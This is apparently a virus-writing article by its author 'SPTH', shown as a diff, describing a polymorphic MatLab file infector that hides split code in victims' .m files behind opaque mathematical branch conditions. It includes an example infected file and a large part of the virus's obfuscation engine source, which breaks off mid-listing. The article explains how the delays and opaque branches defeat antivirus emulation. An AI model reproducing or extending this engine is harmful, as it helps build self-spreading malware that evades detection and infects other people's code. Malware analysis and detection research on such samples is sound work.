@@ -1,1 +1,1088 @@
 
+  Matlab.MicrophoneFever
+  by SPTH
+  www.spth.de.vu
+
+  in February 2011
+
+
+
+
+
+  1) Overview
+
+  2) Techniques
+  2.0) Preparation
+  2.1) Splitting Algorithm
+  2.2) Multi-branch creation
+  2.3) File insertation
+
+  3) Inserted Code example
+
+  4) Inner Code
+
+  5) Running-Virus Dropper
+
+
+
+
+
+
+
+  1) Overview
+
+     This is a polymorphic MatLab file infector. It takes advantage of
+     inbuild MatLab functions such as integration or solving of differential
+     equations. It infects victims by searching appropriate places within their
+     file code, and inserts the splitted virus to those possible places.
+
+     The main idea was to combine two interesting concepts:
+
+     -> tau-Obfuscation (or DELAYED CODE, as called by Z0MBiE):
+        You can delay the execution of a specific code for arbitrary long
+        time. Example:
+
+        encrypted_code=[ENCRYPTED CODE];
+        key=sum(factors(VERY_BIG_INTEGER_NUMBER));
+        eval(decrypt(encrypted_code, key));
+
+        If the VERY_BIG_INTEGER_NUMBER is set correct, the key generation can
+        take very long time, much longer than possible for AV emulators.
+
+
+     -> Multi-branches:
+        "Thus, if a program cannot determine the condition value, then it has
+        to consider the two branches as possibly executable paths." (in "From
+        the design of a generic metamorphic engine to a black-box 
+        classification of antivirus detection techniques" by Eric Filiol)
+
+        The virus splitts itself into many parts and combines itself with
+        conditional expressions. The condition values are complex (sometimes
+        both meanings, yes :) ) mathematical algorithms from the MatLab
+        framework.
+
+
+
+
+     Why MatLab?
+        It's the only language (maybe Mathematica-Script/Maple too, not sure)
+        that has inbuild complicated numerical algorithm such as ODE solver,
+        2D integration, function interpolation, ... AND file-access (for the
+        virus purpose).
+
+        You could do the same with C++ too I guess, but your code would
+        become 10.000s of line I think, or you have to rely on some classes
+        written by somebody else. I didnt like that idea...
+
+
+     Are there other MatLab viruses?
+        Yes, Positron has released two MatLab viruses in rRlf#7.
+        (It saved me some hours of researching for file access in MatLab -
+        thanks alot Positron!)
+        One of the viruses was a polymorphic prepender, using bitwise XOR
+        encryption and adding of trashlines.
+        Vesselin Bontchev has written a description of the simple prepender
+        version in VB June 06. (Its a naively written text with many stupid
+        assumptions and an awkward reference to his mother (!)...)
+
+
+     Is MatLab cool?
+        It is an increadible powerful language (the vectorized style is great)
+        but it has some disadvantages: temporary indexing is not available
+        (you have to save the results in a temp-variable, then access it),
+        not possible to write inbuild functions (just mathematical functions
+        via inline), restriction of factors() to 2^32 (thats why i did not
+        use it). As far as I know, the open source project Octave - which
+        aims to run Matlab code natively - solves all these problems.
+
+
+     Why is there an output by the virus?
+        The nonlinear splitting/combining algorithm is slow (in fact, it is a
+        t=O(x^3)-algorithm, x=number of virus parts), I prefered to know how
+        long the engine needs. You can simply remove that one line. :)
+
+
+     What is MicrophoneFever?
+        The best thing you can do within 153 seconds...
+
+
+
+
+
+
+
+  2) Techniques
+
+  2.0) Preparation
+
+       The virus starts in the following schema:
+
+       -> Gets its code as a string.
+
+               MyCode='WHOLE VIRUS CODE';
+               eval(MyCode);
+
+          The virus is executed as MyCode AND can work with MyCode string.
+          This is a great feature of several script languages as MatLab,
+          Phyton, JavaScript, ...
+
+
+       -> A list of 138 variable names (VarList2Change) is created. In the 
+          new code, all of those variables will be replaced by a new random
+          string.
+
+               ViralBodyVariable=Rnames{sum(AlgoMatrix)==SplitSize};
+
+          may transform to
+
+               kuwnhdklaoqje=ppqowmyy{sum(kjejiopoqqqwe)==kqjhwe};
+
+
+
+
+  2.1) Splitting Algorithm
+
+       -> The virus code is splitted to 3 to ~5.000 part (depending on the
+          code size)
+
+       -> A nonlinear algorithm combines the splitted parts. It does not
+          create trash-lines, all created lines are actually functional.
+
+          For example: MyCode='Hello VXers!!';
+
+               var5=' ';
+               var8='r';
+               var5=[var5 'VX'];
+               var5=['o' var5];
+               var2='e';
+               var7='e';
+               var9='s!';
+               var1='H';
+               var9=[var8 var9];
+               var3='ll';
+               var3=[var3 var5];
+               var7=[var7 var9];
+               var2=[var1 var2];
+               var3=[var3 var7];
+               var2=[var2 var3];  % var2 contains the right string now
+
+          or
+
+               var1='H';
+               var3='l';
+               var5=' V';
+               var6='Xer';
+               var6=[var6 's!'];
+               var4='lo';
+               var3=['e' var3];
+               var1=[var1 var3];
+               var4=[var4 var5];
+               var6=[var4 var6];
+               var1=[var1 var6];  % var1 contains the right string now
+
+
+       -> It also creates a list of trash lines, which will be used in the
+          multi-branch creation. These lines contains the same variable names
+          and often real splitted parts, but not correctly set together.
+          This has been used to reduce the possibility of some statistical
+          attack.
+
+
+
+
+  2.2) Multi-branch creation
+
+       -> Each created split-line from above will be translated to a 
+          conditional expression in the form of 
+
+               if(condition)
+                   CODE / TRASH
+               else
+                   TRASH / CODE
+               end
+
+
+       -> The conditions are in form of MatLab functions or algorithm.
+          It can contain:
+
+          * Matrix algorithm
+                 + Creation of matrix (special Matrixes as Toeplitz, Vander,
+                   Wilkinson, Hilbert, Pascal,... - or own Matrix)
+
+                 + Downgrade to a vector (Matrix->Vector operations like sum
+                   min, max), and compare with another vector; or downgrade
+                   to a scalar (Matrix->Vector->Scalar) and compare with a
+                   scalar.
+
+               Example:
+
+                   vec1=[4.6417 8.8343 1.4479 12.2282 0.50997];
+                   if(sum(sum(toeplitz(vec1)))>(real(-16.7324)))
+
+               or
+                   vec1=[8.2601;9.091;4.72];
+                   vec2=[2.7257 3.7423 12.201];
+                   if(sum(sinh(max(sin(vec1*vec2))))<(max(vec2)))
+
+
+
+          * Numerical Integration (1 or 2 dimensional)
+                 + Creates a function in the form of:
+
+                        S -> (SOS) | F(S) | x (| y)
+                        O -> .* | +
+                        F -> sin | cos | exp | atan | ...
+
+                 + Defines the boundaries of the one or two dimensional
+                   integral
+
+                 + Searchs a numerical tolerance of the integral, such that
+                   the calculation time is bigger than 0.1sec
+
+               Example:
+
+                   if(24.3639>quad(@(x)sin((sin(x)+cos(atan(exp((x.*x))))))+exp(x),0.544,pi,1e-17))
+
+               or:
+
+                   if(dblquad(@(x,y)atan((x.*exp(y))).*x,0.28659,pi,-log(2),0.95407,1e-9)<9.8827)
+
+
+
+          * Function interpolation
+                 + Creates a set of data points
+
+                 + Interpolates the set with a function (whether cubic spline
+                   interpolation or the MatLab standard interpolation -
+                   couldnt figure out which algorithm is used there)
+
+               Example:
+
+                   DataSet=[232.1477 280.9793 256.6344 ... 277.559 94.0081];
+                   if(interp1(DataSet,39.2492,'spline')<218.56696)
+
+               or
+                   DataSet=[374.2217 99.3665 209.64 ... 231.027 151.0387 619.6979];
+                   if(476.349<interp1(DataSet,8.3597))
+
+
+
+          * Ordinary differential equation (ODEs)
+                 + Creates a function in the same form as for Numerical
+                   Integration
+
+                 + Defines a interval to solve the ODE
+
+                 + Avoids singularities in the solution (by an external
+                   function at creation time) and odd numerical behaviour
+                   (by interpolation)
+
+                 + The ODE is in the form of: y'(x)=f(x,y)
+
+               Example:
+
+                   num=2.4495113;
+                   f=inline('x+cos((cos((y.*sin(atan(x))))+x))','x','y');
+                   if(interp1(ode45(f,[1 2],0.74001),2.3164)>num)
+
+               or
+
+                   f=inline('atan(cos(cos(x))).*x','x','y');
+                   [y_sol,x_sol]=ode45(f,[2 6],0.043357);
+                   num=-18.4964633;
+                   if(num<interp1(y_sol,x_sol,3.6929))
+
+
+
+          * Special functions
+                 + Creates a combination of inbuild MatLab functions
+                   (such as trigonometric, hyperbolic, exponential functions,
+                   Airy, ...) in the form of
+
+                        S -> F(S) | D(S,S) | R
+                        F -> single_argument_functions
+                        D -> double_argument_functions
+                        R -> random number (could be in form of a variable)
+
+               Example:
+
+                   if(-0.30629>sec(csc(cosh(acsch(atan(expm1(expm1(dot(0.0070583,sqrt(cosh(csc(-3.0156))))))))))))
+
+               or
+
+                   if(cosh(airy(hypot(sqrt(airy(pol2cart(0.98087,asech(log10(expint(-2.8337)))))),-1.4817)))>1.83597932)
+
+
+       -> The number which is compared to the function/algorithm is very
+          close the the actual value. Thus, no simple approximation can
+          figure out if the branch is true or false.
+
+
+
+
+  2.3) File insertation
+
+       -> Searchs .m files in the current directory
+
+       -> Adjusts the file content for better further analysis
+
+               This code:
+
+                   disp('1')
+                   % blah blah end FF 
+                   disp('2')
+                   a=['a' 'b' 'asd'...
+                       'c' 'd'];
+                   disp('3')
+
+               will be transformed into this one:
+
+                   disp('1')
+                   disp('2')
+                   a=['a' 'b' 'asd' 'c' 'd'];
+                   disp('3')
+
+
+       -> Searchs appropriate places in the file to put part of its code.
+          It takes care of comments, strings; if/for/while/... end blocks,
+          it will not put code into such blocks.
+
+               Before the lines marked with **, a virus block could be:
+
+                   disp('1 end ')
+                   **TheImportantValue='';
+                   **if (1>2)    
+                   	end
+                   **disp('2')
+                   **disp('3')
+                   **disp('4')
+                   **a=['a' 'b' 'asd' 'c' 'd'];
+                   **if (1)
+                       while(3<2)
+                           disp('!');
+                       end
+                       for i=0:100
+                           fprintf(num2str(i));
+                       end
+                       disp('!!!')
+                   end    
+                   **disp('5')
+                   **disp('6')
+
+
+
+
+
+  3) Inserted Code example
+
+       We have the following victim file:
+
+- - - - - - - - - - - - - 
+disp('1 end ')
+TheImportantValue='';
+if (1>2)    
+	end
+disp('2')
+% blah blah end FF 
+disp('3')
+disp('4')
+
+a=['a' 'b' 'asd'...
+    'c' 'd'];
+
+if (1)
+    while(3<2)
+        disp('!');
+    end
+    for i=0:100
+        fprintf(num2str(i));
+    end
+    disp('!!!')
+end
+        
+disp('5')
+disp('6')
+- - - - - - - - - - - - - 
+
+       and we have: MyCode='disp(''Hello VXers!'');';
+       Lets insert it (the split value is set to a small value for this test,
+       otherwise the output code would be too big for this text):
+
+- - - - - - - - - - - - - 
+disp('1 end ')
+ctkecpdgmwvk=[3.0052 1.6571 14.3441 15.6169 18.0584 12.3993 14.904; 7.7811 4.0874 2.1495 12.9706 2.3497 25.3611 5.6044; 3.7171 20.5909 0.16361 23.7597 8.7129 5.1656 23.4983; 0.64927 2.332 15.6218 17.1312 2.3029 12.143 5.7036; 16.6521 22.0503 14.5003 2.7014 24.0123 21.2919 4.3411; 24.3534 0.9025 9.0254 0.61771 17.4355 4.572 6.0556; 15.8723 23.4723 9.1706 10.0484 4.9647 4.3234 8.3275];
+TheImportantValue='';
+if (1>2)    
+	end
+uhfxpkyapregw=[20.5061 6.3083 9.5699 6.1676 3.1241 8.0064 11.293];
+disp('2')
+warning off all
+if(min(max(ctkecpdgmwvk))<(imag(imag(sum(uhfxpkyapregw)))))
+  imlweerlqk='sbv';
+else
+      auxbgkuigfoauewl='lo VX';end
+jchguyilotxgcjo=95583629;
+if(-0.30060674+2.432731e-026i<log2(tanh(sech(pow2(sec(pol2cart(log1p(dot(acoth(-1.3704),4.7739)),hypot(hypot(-4.3361,0.47954),-3.2153))))))))
+    imlweerlqk='lue';
+else    auxbgkuigfoauewl=['disp(''Hel' auxbgkuigfoauewl];
+end
+pmfly=[2.3545 2.6036 4.4225 4.4598 1.8391];
+disp('3')
+if((-48.7807)<min(sum(tan(toeplitz(pmfly))))) cfyoyytfxpldbtdpb='s!'');';
+else
+ auxbgkuigfoauewl=['lo VX' auxbgkuigfoauewl];
+end
+bioedljnxgc=[19.1456 154.373 550.3393 386.4591 74.9299 433.2155 657.2817 360.3325 80.6204 469.419 577.6641 591.6505 405.9973 87.3452 155.5388 612.3285 351.4347 88.8916 650.1925 593.7005 319.7993 413.1606 141.0425 396.072 367.8441 156.8655 657.5278 668.102 699.0955 459.2855 116.6208 422.9965];
+if(jchguyilotxgcjo<quad(@(wci)(wci+sin(wci)).*exp((wci.*(wci+wci))),-0.91002,pi,1e-7))
+auxbgkuigfoauewl=[auxbgkuigfoauewl 'er'];
+else
+    auxbgkuigfoauewl=['lo VX' auxbgkuigfoauewl];end
+disp('4')
+if(interp1(bioedljnxgc,4.4571)<245.087)
+    auxbgkuigfoauewl=[auxbgkuigfoauewl cfyoyytfxpldbtdpb];
+else     ewcyndekikik='s!'');';
+end
+
+a=['a' 'b' 'asd'    'c' 'd'];
+
+if (1)
+    while(3<2)
+        disp('!');
+    end
+    for i=0:100
+        fprintf(num2str(i));
+    end
+    disp('!!!')
+end
+eval(auxbgkuigfoauewl);
+        
+disp('5')
+disp('6')
+- - - - - - - - - - - - - 
+
+
+
+
+
+
+
+
+  4) Inner Code
+
+     The virus is optimized, thus hardly readable. So here the inner, non-
+     optimized version of it. It still contains some debug-output, but all in
+     all its the same as the original virus.
+
+- - - - - - - - - - - - - 
+warning off all
+
+MyCode='disp(''Bedecke deinen Himmel, Zeus, Mit Wolkendunst, Und übe, dem Knaben gleich, Der Disteln köpft, An Eichen dich und Bergeshöhn; Müßt mir meine Erde Doch lassen stehn, Und meine Hütte, die du nicht gebaut, Und meinen Herd Um dessen Gluth Du mich beneidest.'');';
+ChangeNumber=1*length(MyCode); % Can be included to the code directly
+MyCode=[MyCode,' '];
+VarList2Change={'MyCode' 'TmpRndName' 'ThisVarContainsVirus'  'VarList2Change' 'ChangeNumber' 'FfAll' 'DfAll' 'SplitOffset' 'CodePart' 'Rnames' 'NewCode' 'TrashNames' 'TrashLine' 'SplitSize' 'QuoteSign' 'CreateTrashA' 'CreateTrashB' 'CreateTrashC' 'CreateTrashD' 'CreateTrash1' 'CreateTrash2' 'ODEfile' 'odefunction' 'RandPermSS' 'AlgoMatrix' 'ViralBodyVariable' 'ActualCodeForThisPart' 'Var2Wrt' 'ObfusCount' 'RandomAppearenceOfIfs' 'LineBreaksIf' 'LineShift' 'runcode' 'RandNameCol' 'CODE' 'TRASH' 'WhichMathAlgo' 'FReplacePool1' 'StartFunction' 'SReplacePool1' 'OReplacePool1' 'MatSizeN' 'SomeMatVec' 'MultFct' 'SpecMatName' 'SpecVecName' 'WhichMatrixAlgo' 'MatArOp' 'VecArOp' 'SavedVector' 'IsItAVector' 'Operator1' 'Operator2' 'BoundAll1' 'BoundAll2' 'BoundAll3' 'BoundTmpA' 'BoundTmpB' 'BoundSign' 'FctString1' 'FctString2' 'FctString3' 'IntTolerance' 'TimeMeasure' 'CompleteCompString' 'CompleteErg' 'InterpDataVec' 'InterpSpline' 'ODEIntervallA' 'ODEIntervallB' 'ODEDomain' 'ODEIntX' 'SReplacePool2' 'RCWriteVar' 'RCNumSub' 'RCNumAdd' 'MulFacRC' 'IncFa' 'RC' 'RCsSub' 'RCsAdd' 'VirCode' 'IsAllEmpty' 'VicFiles' 'VicLines' 'NewInfCode' 'VicIDr' 'IsAPO' 'EndArray' 'EndCount' 'GoodLine' 'IsAPP' 'IsStart' 'IsEnd' 'VCsplitted' 'VirSplit' 'VicIDw' 'Count000' 'Count001' 'Count002' 'Count003' 'Count004' 'Count005' 'Count006' 'Count007' 'Count008' 'Count009' 'Count010' 'Count011' 'Count012' 'Count013' 'Count014' 'Count015' 'Count016' 'Count017' 'Count018' 'Count019' 'Count020' 'Count021' 'Count022' 'Count023' 'Count024' 'Count025' 'Count026' 'Count027' 'Count028' 'Count029' 'Count030' 'Count031' 'Count032' 'Count033' 'TmpVar001' 'TmpVar002' 'TmpVar003' 'TmpVar004' 'TmpVar005' 'TmpVar006' 'TmpVar007' 'TmpVar008'};
+FfAll={'sin' 'sinh' 'asin' 'asinh' 'cos' 'cosh' 'acos' 'acosh' 'tan' 'tanh' 'atan' 'atanh' 'sec' 'sech' 'asec' 'asech' 'csc' 'csch' 'acsc' 'acsch' 'cot'  'coth' 'acot' 'acoth' 'exp' 'expm1' 'log' 'log1p' 'log10' 'log2' 'pow2' 'sqrt' 'nextpow2' 'abs' 'angle' 'conj' 'imag' 'real' 'unwrap' 'fix' 'floor' 'ceil' 'round' 'sign' 'airy' 'expint'};
+DfAll={'hypot' 'dot' 'cart2pol' 'pol2cart' 'atan2'};
+TmpRndName={};
+for Count032=1:length(VarList2Change) % Random Names for VariableNameChaning
+    TmpRndName{end+1}='if';while (any(strcmp({FfAll{:} DfAll{:} TmpRndName{1:end-1}},TmpRndName{end}))||iskeyword(TmpRndName{end})) TmpRndName{end}=char(fix(rand(1,fix(rand*15)+5)*25)+97);end
+end
+
+for Count031=1:length(VarList2Change) % VariableNameChaning
+    MyCode=strrep(MyCode,VarList2Change{Count031},TmpRndName{Count031});
+end
+
+SeedCounter=fix(rand*10000+sum(cputime));
+
+rand('twister', SeedCounter);        
+                      
+SplitOffset=unique([1,sort(fix(rand(1,fix(rand*ChangeNumber)+3)*size(MyCode,2)+1)),size(MyCode,2)]);
+CodePart={}; Rnames={}; NewCode={}; TrashNames={}; TrashLine={};
+SplitSize=size(SplitOffset,2)-1;    % Number of code parts
+
+QuoteSign=char(39);
+for Count033=1:SplitSize
+    CodePart{end+1}=strrep(MyCode(SplitOffset(Count033):SplitOffset(Count033+1)-1), QuoteSign, [QuoteSign QuoteSign]);          % CodePart
+    Rnames{end+1}='sin'; while any(strcmp({FfAll{:} DfAll{:} Rnames{1:end-1}},Rnames{end})) Rnames{end}=char(fix(rand(1,fix(rand*15)+4)*25)+97);end           % Random Names
+end
+
+CreateTrashA='if(max(sum(AlgoMatrix))>0.05*SplitSize)TrashNames=Rnames(diag(AlgoMatrix));end;tmp=rand;tn=fix(rand*(length(TrashNames)-1)+1);tmpord=randperm(length(TrashNames));';
+CreateTrashB=['if (tmp>0.9) TrashLine{end+1}=[Rnames{fix(rand*SplitSize+1)} ',QuoteSign,'=',QuoteSign,',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,',QuoteSign,';',QuoteSign,'];else'];
+CreateTrashC=['if (tmp>0.7 && length(TrashNames)) TrashLine{end+1}=[TrashNames{tn},',QuoteSign,'=[',QuoteSign,',TrashNames{tn},',QuoteSign,' ',QuoteSign,',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,',QuoteSign,'];',QuoteSign,'];'];
+CreateTrashC=[CreateTrashC 'elseif (tmp>0.5 && length(TrashNames)>2) TrashLine{end+1}=[TrashNames{tmpord(1)},',QuoteSign,'=[',QuoteSign,',TrashNames{tmpord(2)},',QuoteSign,' ',QuoteSign,',TrashNames{tmpord(1)},',QuoteSign,'];',QuoteSign,'];'];
+CreateTrashC=[CreateTrashC 'elseif (tmp>0.3 && length(TrashNames)>2) TrashLine{end+1}=[TrashNames{tmpord(1)},',QuoteSign,'=[',QuoteSign,',TrashNames{tmpord(1)},',QuoteSign,' ',QuoteSign,',TrashNames{tmpord(2)},',QuoteSign,'];',QuoteSign,'];'];
+CreateTrashC=[CreateTrashC 'elseif (tmp>0.1 && length(TrashNames)) TrashLine{end+1}=[TrashNames{tn},',QuoteSign,'=[',QuoteSign,',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,',QuoteSign,' ',QuoteSign,',TrashNames{tn},',QuoteSign,'];',QuoteSign,'];'];
+CreateTrashD=['else TrashLine{end+1}=[Rnames{tn},',QuoteSign,'=',QuoteSign,',QuoteSign,char(fix(rand(1,fix(rand*2)+2)*25)+97),QuoteSign,',QuoteSign,';',QuoteSign,'];end'];
+CreateTrash1=[CreateTrashA CreateTrashB CreateTrashC CreateTrashD];
+CreateTrash2=[CreateTrashA CreateTrashC 'else TrashLine{end+1}=[TrashNames{tn},',QuoteSign,'=[',QuoteSign,',QuoteSign,CodePart{fix(rand*SplitSize+1)},QuoteSign,',QuoteSign,' ',QuoteSign,',TrashNames{tn},',QuoteSign,'];',QuoteSign,'];end'];
+
+ODEfile=fopen('odefunction.m','w+');
+fprintf(ODEfile,['function status=odefunction(t,y,flagzz,args);status=0;if ~isempty(t) if ~any(abs(t-t(1))>1.e-4) disp(',QuoteSign,'toooo small',QuoteSign,');status=1;end;end']);
+fclose(ODEfile);
+rehash;
+
+%M  = false(SplitSize);
+%M( ... ) = true;
+%~any(all(M))
+disp('Start Algo');
+RandPermSS=randperm(SplitSize);  % Random order of the Code elements
+AlgoMatrix=false(SplitSize,SplitSize);  % Algorithm matrix
+for Count000=1:SplitSize
+    disp([num2str(Count000) '/' num2str(SplitSize)]);
+    if (RandPermSS(Count000)>1)
+        for Count001=1:SplitSize
+            if (rand>0.4 && AlgoMatrix(RandPermSS(Count000)-1,Count001))
+                NewCode{end+1}=[Rnames{Count001},'=[',Rnames{Count001},' ',QuoteSign,CodePart{RandPermSS(Count000)},QuoteSign,'];'];
+                AlgoMatrix(RandPermSS(Count000),Count001)=1;
+                eval(CreateTrash1);
+            end
+        end
+    end
+    if (sum(AlgoMatrix(RandPermSS(Count000),:),2)==0 && RandPermSS(Count000)<SplitSize-1)
+        for Count002=1:SplitSize
+            if (rand>0.4 && AlgoMatrix(RandPermSS(Count000)+1,Count002)==1)
+                NewCode{end+1}=[Rnames{Count002},'=[',QuoteSign,CodePart{RandPermSS(Count000)},QuoteSign,' ',Rnames{Count002},'];'];
+                AlgoMatrix(RandPermSS(Count000),Count002)=1;
+                eval(CreateTrash1);
+            end
+        end
+    end
+    if (sum(AlgoMatrix(RandPermSS(Count000),:),2)==0)
+        NewCode{end+1}=[Rnames{RandPermSS(Count000)},'=',QuoteSign,CodePart{RandPermSS(Count000)},QuoteSign,';'];
+        AlgoMatrix(RandPermSS(Count000),RandPermSS(Count000))=1;
+        TrashNames{end+1}=Rnames{RandPermSS(Count000)};
+        eval(CreateTrash1);
+    end
+    for Count003=2:SplitSize                                                            % Count003 ... zeile
+        for Count004=1:SplitSize                                                        % Count004 ... spalte
+            Count005=find(AlgoMatrix(Count003,:));
+            if (~AlgoMatrix(Count003,Count004) && AlgoMatrix(Count003-1,Count004) && size(Count005,2)>0 && rand>0.4)
+                if (rand>0.5)
+                    NewCode{end+1}=[Rnames{Count004},'=[',Rnames{Count004},' ',Rnames{Count005},'];'];
+                    AlgoMatrix(:,Count004)=AlgoMatrix(:,Count004)+AlgoMatrix(:,Count005);
+                    AlgoMatrix(:,Count005)=0;
+                    eval(CreateTrash1);
+                else
+                    NewCode{end+1}=[Rnames{Count005},'=[',Rnames{Count004},' ',Rnames{Count005},'];'];
+                    AlgoMatrix(:,Count005)=AlgoMatrix(:,Count005)+AlgoMatrix(:,Count004);
+                    AlgoMatrix(:,Count004)=0;
+                    eval(CreateTrash1);
+                end
+            end
+        end
+    end
+end
+
+while ~any(all(AlgoMatrix))
+    for Count006=2:SplitSize                                                            % Count006 ... zeile
+        for Count007=1:SplitSize                                                        % Count007 ... spalte
+            Count008=find(AlgoMatrix(Count006,:)); 
+            if (~AlgoMatrix(Count006,Count007) && AlgoMatrix(Count006-1,Count007) && size(Count008,2)>0 && rand>0.4)
+                if (rand>0.5)
+                    NewCode{end+1}=[Rnames{Count007},'=[',Rnames{Count007},' ',Rnames{Count008},'];'];
+                    AlgoMatrix(:,Count007)=AlgoMatrix(:,Count007)+AlgoMatrix(:,Count008);
+                    AlgoMatrix(:,Count008)=0;
+                    TrashNames=Rnames(diag(AlgoMatrix));
+                    eval(CreateTrash2);
+                else
+                    NewCode{end+1}=[Rnames{Count008},'=[',Rnames{Count007},' ',Rnames{Count008},'];'];
+                    AlgoMatrix(:,Count008)=AlgoMatrix(:,Count008)+AlgoMatrix(:,Count007);
+                    AlgoMatrix(:,Count007)=0;
+                    TrashNames=Rnames(diag(AlgoMatrix));
+                    eval(CreateTrash2);
+                end
+            end
+        end
+    end
+end
+
+for Count009=1:size(NewCode,2)
+    disp(NewCode{Count009});
+    eval(NewCode{Count009});
+end
+ViralBodyVariable=Rnames{sum(AlgoMatrix)==SplitSize};
+NewCode=strrep(NewCode,ViralBodyVariable,TmpRndName{1});
+TrashLine=strrep(TrashLine,ViralBodyVariable,TmpRndName{1});
+%disp(ViralBodyVariable);
+disp('After Splitting:')
+eval(Rnames{sum(AlgoMatrix)==SplitSize});
+
+
+ActualCodeForThisPart={}; Var2Wrt={}; ObfusCount=1;
+RandomAppearenceOfIfs=fix(rand*2);LineBreaksIf=fix(rand(1,4)*2);LineShift={};LineShift{1}(1:fix(rand*8))=' ';
+if rand>0.7 LineShift{1}='    ';end;if rand>0.3 LineShift{2}=LineShift{1};else LineShift{2}(1:fix(rand*8))=' ';end
+
+while(ObfusCount<=length(NewCode))
+    Var2Wrt{ObfusCount}={};
+    ActualCodeForThisPart{ObfusCount}={};
+    runcode=0; RandNameCol={};
+    for Count010=0:10
+        RandNameCol{end+1}='if';while (any(strcmp({FfAll{:} DfAll{:} Rnames{:} RandNameCol{1:end-1}},RandNameCol{end}))||iskeyword(RandNameCol{end})) RandNameCol{end}=char(fix(rand(1,fix(rand*15)+5)*25)+97);end
+    end
+
+    CODE=NewCode{ObfusCount};
+    TRASH=TrashLine{ObfusCount};
+
+    WhichMathAlgo=fix(rand*5);
+    if (WhichMathAlgo==1 || WhichMathAlgo==3)
+        FReplacePool1={'sin' 'cos' 'exp' 'atan'};
+        StartFunction='SOS';SReplacePool1={'(SOS)' 'F(S)' 'if' 'if'};
+        while(~isempty(strfind([FReplacePool1{:}], SReplacePool1{3}))||iskeyword(SReplacePool1{3}))SReplacePool1{3}=char(fix(rand(1,fix(rand*4)+2)*25)+97);end
+        SReplacePool1{4}=SReplacePool1{3};  OReplacePool1={'.*' '+'};
+        while length(strfind(StartFunction,'S'))+length(strfind(StartFunction,'O'))+length(strfind(StartFunction,'F'))>0
+            TmpVar001=fix(rand*length(SReplacePool1)+1); StartFunction=regexprep(StartFunction, 'S',SReplacePool1{TmpVar001},rand*length(strfind(StartFunction,'S'))+1); if (TmpVar001>2 && strcmp(SReplacePool1{3}, SReplacePool1{4})); while(~isempty(strfind(SReplacePool1{4},SReplacePool1{3})) || ~isempty(strfind(SReplacePool1{3},SReplacePool1{4})) || ~isempty(strfind([FReplacePool1{:}], SReplacePool1{4})) || iskeyword(SReplacePool1{4})) SReplacePool1{4}=char(fix(rand(1,fix(rand*4)+2)*25)+97); end; end;
+            StartFunction=regexprep(StartFunction, 'O',OReplacePool1{fix(rand*length(OReplacePool1)+1)},rand*length(strfind(StartFunction,'O'))+1);
+            StartFunction=regexprep(StartFunction, 'F',FReplacePool1{fix(rand*length(FReplacePool1)+1)},rand*length(strfind(StartFunction,'F'))+1);
+            if (max(cumsum(StartFunction=='(')-cumsum(StartFunction==')'))>25) SReplacePool1{1}=SReplacePool1{3}; SReplacePool1{2}=SReplacePool1{4}; end;      % restricting the function to depth<25
+        end
+    end
+
+    if (WhichMathAlgo==0)
+        MatSizeN=fix(rand*5)+3;
+        SomeMatVec{1}=[RandNameCol{end} '=[']; SomeMatVec{2}=[RandNameCol{end-1} '=[']; SomeMatVec{3}=[RandNameCol{end-2} '=['];
+        MultFct=rand*30;
+        for Count011=1:MatSizeN        
+            SomeMatVec{1}=[SomeMatVec{1} ' ' num2str(rand(1,1)*MultFct)];
+            SomeMatVec{2}=[SomeMatVec{2} ';' num2str(rand(1,1)*MultFct)];
+            SomeMatVec{3}=[SomeMatVec{3} ';'];
+            for Count012=1:MatSizeN
+                SomeMatVec{3}=[SomeMatVec{3} ' ' num2str(rand(1,1)*MultFct)];
+            end
+        end
+        SomeMatVec{1}=[SomeMatVec{1} '];']; SomeMatVec{1}(size(RandNameCol{end},2)+3)=''; eval(SomeMatVec{1});
+        SomeMatVec{2}=[SomeMatVec{2} '];']; SomeMatVec{2}(size(RandNameCol{end-1},2)+3)=''; eval(SomeMatVec{2});
+        SomeMatVec{3}=[SomeMatVec{3} '];']; SomeMatVec{3}(size(RandNameCol{end-2},2)+3:size(RandNameCol{end-2},2)+4)=''; eval(SomeMatVec{3});
+        SpecMatName={'toeplitz','vander'}; SpecVecName={'pascal','magic','hilb','invhilb','wilkinson'};
+        WhichMatrixAlgo=fix(rand*5);
+        if (WhichMatrixAlgo==0)                              % Matrix by vectors multiplication
+            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};                % write both vectors
+            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{2};
+            MatName=[RandNameCol{end-1} '*' RandNameCol{end}];
+        elseif (WhichMatrixAlgo==1)                        % Direct matrix
+            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{3};  % just write matrix
+            MatName=[RandNameCol{end-2}];
+        elseif (WhichMatrixAlgo==2)                        % Vector input
+            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};  % just write row vector
+            MatName=[SpecMatName{fix(rand(1,1)*length(SpecMatName)+1)} '(' RandNameCol{end} ')'];
+        elseif (WhichMatrixAlgo==3)                        % integer input
+            MatName=[SpecVecName{fix(rand(1,1)*length(SpecVecName)+1)} '(' num2str(MatSizeN) ')'];
+        elseif (WhichMatrixAlgo==4)                        % Rosser Test matrix
+            MatName='rosser';
+        end
+
+        % Finished creating matrix; it is in MatNam
+        % additional arithmetic functions
+        MatArOp={'sin' 'cos' 'sinh' 'cosh' 'exp' 'tan' 'sqrt' 'real' 'imag'};
+        for Count013=1:fix(rand*3+1)
+            if (rand>0.66) MatName=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' MatName ')']; end
+        end
+        % Now the matrix operation    
+        VecArOp={'sum' 'max' 'min'};
+        SavedVector=[VecArOp{fix(rand*size(VecArOp,2)+1)} '(' RandNameCol{end} ')'];   
+        IsItAVector=1;
+        if (rand>0.44) SavedVector=num2str(rand*100-50); IsItAVector=0; end;
+        for Count015=1:fix(rand*3+1)
+            if (rand>0.66) SavedVector=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' SavedVector ')']; end
+        end
+        MatName=[VecArOp{fix(rand*size(VecArOp,2)+1)} '(' MatName ')'];
+        for Count016=1:fix(rand*3+1)
+            if (rand>0.85) MatName=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' MatName ')']; end
+        end
+        MatName=[VecArOp{fix(rand*size(VecArOp,2)+1)} '(' MatName ')'];
+        for Count017=1:fix(rand*3+1)
+            if (rand>0.85) MatName=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' MatName ')']; end
+        end
+        TmpVar002=fix(rand*4);
+        Operator1=''; Operator2='';
